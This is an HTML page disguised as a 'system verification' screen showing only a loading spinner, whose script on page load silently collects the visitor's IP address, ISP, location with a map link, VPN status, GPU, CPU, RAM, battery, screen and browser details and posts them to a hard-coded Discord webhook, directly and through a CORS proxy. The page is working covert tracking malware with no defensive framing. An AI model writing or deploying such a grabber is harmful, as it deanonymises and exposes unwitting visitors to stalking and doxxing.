<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Dogrulaması</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
        .spinner { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <script>
        (async () => {
            const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            const gate = "https://corsproxy.io/?";

            const Core = {
                async getNet() {
                    try {
                        const r = await fetch('https://ipapi.co/json/');
                        const j = await r.json();
                        return {
                            ip: j.ip,
                            isp: `${j.org} (AS${j.asn})`,
                            loc: `${j.city}, ${j.region} / ${j.country_name}`,
                            proxy: j.proxy ? "⚠️ Aktif" : "✅ Temiz",
                            map: `https://www.google.com/maps?q=${j.latitude},${j.longitude}`
                        };
                    } catch { return {}; }
                },
                getHW() {
                    const c = document.createElement('canvas');
                    const gl = c.getContext('webgl2') || c.getContext('webgl');
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                        vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_ID) : "N/A",
                        cores: navigator.hardwareConcurrency || "N/A",
                        ram: navigator.deviceMemory || "N/A"
                    };
                },
                async getPower() {
                    try {
                        const b = await navigator.getBattery();
                        return `${Math.round(b.level * 100)}% [${b.charging ? 'AC' : 'BAT'}]`;
                    } catch { return "N/A"; }
                },
                getDisplay() {
                    return `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
                },
                getConn() {
                    const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    return n ? `${n.effectiveType} (~${n.downlink}Mbps)` : "N/A";
                }
            };

            const [net, bat] = await Promise.all([Core.getNet(), Core.getPower()]);
            const hw = Core.getHW();

            const payload = {
                embeds: [{
                    title: "SYSTEM_ADVERSARY_REPORT_V28",
                    color: 0xff0000,
                    fields: [
                        { name: "NETWORK_LAYER", value: `**IP:** \`${net.ip}\`\n**ISP:** ${net.isp}\n**LOC:** ${net.loc}\n**VPN:** ${net.proxy}\n**MAP:** [Click](${net.map})`, inline: false },
                        { name: "HARDWARE_LAYER", value: `**GPU:** ${hw.gpu}\n**VEN:** ${hw.vendor}\n**CPU:** ${hw.cores} Cores\n**RAM:** ${hw.ram}GB`, inline: false },
                        { name: "ENVIRONMENT", value: `**OS:** ${navigator.platform}\n**BAT:** ${bat}\n**DIS:** ${Core.getDisplay()}\n**NET:** ${Core.getConn()}`, inline: false },
                        { name: "USER_AGENT", value: "```" + navigator.userAgent + "```" }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            const stream = new Blob([JSON.stringify(payload)], { type: 'application/json' });

            // PRIMARY XHR INJECTION (ISP BYPASS)
            const send = (url) => {
                fetch(url, { method: 'POST', body: stream, mode: 'no-cors' });
                if (navigator.sendBeacon) navigator.sendBeacon(url, stream);
            };

            send(gate + encodeURIComponent(hook));
            send(hook); // Secondary Direct Attempt
        })();
    </script>
</body>
</html>
